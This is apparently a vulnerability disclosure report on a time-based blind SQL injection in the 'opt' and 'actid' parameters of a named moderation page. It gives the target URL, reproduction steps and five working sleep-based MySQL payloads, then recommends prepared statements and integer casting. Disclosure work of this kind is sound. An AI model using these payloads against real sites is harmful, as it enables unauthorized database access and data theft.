# SQL Injection - Time-Based Blind

## Summary

I identified a Time-Based Blind SQL Injection vulnerability in the application.

The application accepts user-controlled input through the `opt` and `actid` parameters and concatenates it directly into SQL queries without proper sanitization or parameterization. By injecting time-based SQL payloads, an attacker can infer database information based on the response time of the server. The payloads cause the database to sleep for a specified duration, confirming the presence of a SQL injection vulnerability.

An attacker can craft malicious inputs that cause the database to delay its response, allowing the attacker to determine if the injection was successful.

## Vulnerability Type

**SQL Injection (Time-Based Blind)**

## Vulnerable Parameters

```text
opt
actid
```

## Vulnerable URL

```text
https://kzlab.sn/subdomains/moderation/index.php?opt=1&actid=415523
```

## Steps to Reproduce

1. Intercept a request using Burp Suite or similar proxy tool.

2. Replace the parameter value with a time-based payload:

   ```text
   -sleep(10)
   ```

3. Send the request.

4. Observe that the server takes approximately 10 seconds to respond, confirming successful injection.

## Payloads Used

```text
-sleep(10)
(select*from(select(sleep(10))))a
'X'OR(if(now()=sysdate(),sleep(10),0))XOR('Z')
'X'OR(if(now()=sysdate(),sleep(6*2),0))XOR('Z')
'X'OR(if(now()=sysdate(),sleep(5*5),0))OR('')
```

## Proof of Concept

The application takes user input and concatenates it into a SQL query:

```sql
SELECT * FROM table WHERE actid = '415523' -sleep(10)
```

When the payload is executed, the `sleep(10)` function is called, causing a 10-second delay in the response.

## Impact

An attacker can:

- Enumerate database structure and content
- Extract sensitive data (usernames, passwords)
- Bypass authentication
- Gain unauthorized access

## Recommendation

To mitigate this vulnerability:

- Use **prepared statements** with parameterized queries.
  ```php
  $stmt = $conn->prepare("SELECT * FROM table WHERE actid = ?");
  $stmt->bind_param("i", $actid);
  $stmt->execute();
  ```

- Use **input validation** to ensure numeric parameters are integers.
  ```php
  $actid = (int)$_GET['actid'];
  ```
